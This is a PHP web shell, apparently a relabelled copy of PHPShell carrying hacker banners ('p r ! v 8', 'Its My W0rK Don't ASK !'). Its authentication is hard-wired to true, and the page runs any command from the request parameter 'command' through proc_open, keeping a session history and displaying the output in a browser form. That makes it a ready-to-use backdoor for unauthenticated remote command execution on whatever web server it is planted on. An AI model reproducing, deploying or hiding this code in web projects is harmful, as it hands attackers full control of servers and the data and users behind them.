<?php // -*- coding: utf-8 -*-
/* Security PASSWORD BY AGHILAS
/* ENCODING By Hidden Pain
/* 
/* Warning : We Don't Know Who Creat This PHP SHELL.
/* The Devloper is Unknown !
/*
/* Set your aliases here.  Each key in the array will be substituted
 * with the corresponding value before the commands are executed. */
$aliases = array('ls' => 'ls -CvhF',
                 'll' => 'ls -lvhF');

{
  $authenticated = true;

  /* We now start the session. */
  session_start();
  
  /* Initialize the session variables. */
  if (empty($_SESSION['cwd']) || !empty($_REQUEST['reset'])) {
    $_SESSION['cwd'] = getcwd();
    $_SESSION['history'] = array();
    $_SESSION['output'] = '';
  }
  
  if (!empty($_REQUEST['command'])) {
    if (get_magic_quotes_gpc()) {
      /* We don't want to add the commands to the history in the
       * escaped form, so we remove the backslashes now. */
      $_REQUEST['command'] = stripslashes($_REQUEST['command']);
    }

    /* Save the command for late use in the JavaScript.  If the
     * command is already in the history, then the old entry is
     * removed before the new entry is put into the list at the
     * front. */
    if (($i = array_search($_REQUEST['command'], $_SESSION['history'])) !== false)
      unset($_SESSION['history'][$i]);
    
    array_unshift($_SESSION['history'], $_REQUEST['command']);
  
    /* Now append the commmand to the output. */
    $_SESSION['output'] .= '$ ' . $_REQUEST['command'] . "\n";

    /* Initialize the current working directory. */
    if (ereg('^[[:blank:]]*cd[[:blank:]]*$', $_REQUEST['command'])) {
      $_SESSION['cwd'] = dirname(__FILE__);
    } elseif (ereg('^[[:blank:]]*cd[[:blank:]]+([^;]+)$', $_REQUEST['command'], $regs)) {
      /* The current command is a 'cd' command which we have to handle
       * as an internal shell command. */

      if ($regs[1][0] == '/') {
        /* Absolute path, we use it unchanged. */
        $new_dir = $regs[1];
      } else {
        /* Relative path, we append it to the current working
         * directory. */
        $new_dir = $_SESSION['cwd'] . '/' . $regs[1];
      }
      
      /* Transform '/./' into '/' */
      while (strpos($new_dir, '/./') !== false)
        $new_dir = str_replace('/./', '/', $new_dir);

      /* Transform '//' into '/' */
      while (strpos($new_dir, '//') !== false)
        $new_dir = str_replace('//', '/', $new_dir);

      /* Transform 'x/..' into '' */
      while (preg_match('|/\.\.(?!\.)|', $new_dir))
        $new_dir = preg_replace('|/?[^/]+/\.\.(?!\.)|', '', $new_dir);
      
      if ($new_dir == '') $new_dir = '/';
      
      /* Try to change directory. */
      if (@chdir($new_dir)) {
        $_SESSION['cwd'] = $new_dir;
      } else {
        $_SESSION['output'] .= "cd: could not change to: $new_dir\n";
      }
      
    } else {
      /* The command is not a 'cd' command, so we execute it after
       * changing the directory and save the output. */
      chdir($_SESSION['cwd']);

      /* Alias expansion. */
      $length = strcspn($_REQUEST['command'], " \t");
      $token = substr($_REQUEST['command'], 0, $length);
      if (isset($aliases[$token]))
        $_REQUEST['command'] = $aliases[$token] . substr($_REQUEST['command'], $length);
    
      $p = proc_open($_REQUEST['command'],
                     array(1 => array('pipe', 'w'),
                           2 => array('pipe', 'w')),
                     $io);

      /* Read output sent to stdout. */
      while (!feof($io[1])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[1]),
                                                ENT_COMPAT, 'UTF-8');
      }
      /* Read output sent to stderr. */
      while (!feof($io[2])) {
        $_SESSION['output'] .= htmlspecialchars(fgets($io[2]),
                                                ENT_COMPAT, 'UTF-8');
      }
      
      fclose($io[1]);
      fclose($io[2]);
      proc_close($p);
    }
  }

  /* Build the command history for use in the JavaScript */
  if (empty($_SESSION['history'])) {
    $js_command_hist = '""';
  } else {
    $escaped = array_map('addslashes', $_SESSION['history']);
    $js_command_hist = '"", "' . implode('", "', $escaped) . '"';
  }
}

header('Content-Type: text/html; charset=UTF-8');
/* Since most installations still operate with short_open_tag enabled,
 * we have to echo this string from within PHP: */
echo '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en" lang="en">
<head>
  <title> ---- p r ! v 8 ----  </title>
  <link rel="stylesheet" href="phpshell.css" type="text/css" />

  <script type="text/javascript" language="JavaScript">
  var current_line = 0;
  var command_hist = new Array(<?php echo $js_command_hist ?>);
  var last = 0;

  function key(e) {
    if (!e) var e = window.event;

    if (e.keyCode == 38 && current_line < command_hist.length-1) {
      command_hist[current_line] = document.shell.command.value;
      current_line++;
      document.shell.command.value = command_hist[current_line];
    }

    if (e.keyCode == 40 && current_line > 0) {
      command_hist[current_line] = document.shell.command.value;
      current_line--;
      document.shell.command.value = command_hist[current_line];
    }

  }

function init() {
  document.shell.setAttribute("autocomplete", "off");
  document.shell.output.scrollTop = document.shell.output.scrollHeight;
  document.shell.command.focus();
}

  </script>
</head>

<body onload="init()">

<h1><font color="red">P.V8  <><> S_C_R_!_P_T<font color="black"></h1>

<?php if (!$authenticated) { ?>
<p><b> D <a
href="<?php echo $_SERVER['PHP_SELF'] ?>">reload</a> D</p>

<p> D <a href="INSTALL">INSTALL</a> 
D</b></p>

</body>
</html>

<?php // ' <-- fix syntax highlight in Emacs
  exit;
}

error_reporting (E_ALL);

if (empty($_REQUEST['rows'])) $_REQUEST['rows'] = 24;

?>

<p><b>Its My W0rK Don't ASK !</b> <code><?php echo $_SESSION['cwd'] ?></code></p>

<form name="shell" action="<?php echo $_SERVER['PHP_SELF'] ?>" method="post">
<div>
<textarea name="output" readonly="readonly" cols="80" rows="<?php echo $_REQUEST['rows'] ?>">
<?php
$lines = substr_count($_SESSION['output'], "\n");
$padding = str_repeat("\n", max(0, $_REQUEST['rows']+1 - $lines));
echo rtrim($padding . $_SESSION['output']);
?>
</textarea>
<p class="prompt">
  $&nbsp;<input class="prompt" name="command" type="text"
                onkeyup="key(event)" size="78" tabindex="1">
</p>
</div>
<p>
  <input type="submit" value="Execute Command" />
  <input type="submit" name="reset" value="Reset" />
  Rows: <input type="text" name="rows" value="<?php echo $_REQUEST['rows'] ?>" />
</p>
</form>